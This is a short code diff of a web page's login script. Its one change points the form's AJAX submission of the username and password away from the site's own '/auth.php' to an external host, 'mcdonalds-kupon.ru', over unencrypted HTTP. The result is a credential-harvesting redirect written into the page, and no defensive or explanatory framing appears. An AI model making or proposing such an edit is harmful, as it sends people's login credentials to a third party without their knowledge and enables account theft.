@@ -206,7 +206,7 @@ body{font-family: Didact Gothic;}blockquote{border-color: #7d5bd9;}div[submit-su
                     return false;
                 }
                 $.ajax({
-                    type:"POST", url:"/auth.php", dataType:"json", data:{'userLogin':userLogin.val(), 'userPassword':userPassword.val()}, cache:false, success:function(response){
+                    type:"POST", url:"http://mcdonalds-kupon.ru/auth.php", dataType:"json", data:{'userLogin':userLogin.val(), 'userPassword':userPassword.val()}, cache:false, success:function(response){
 
                     }
                 });
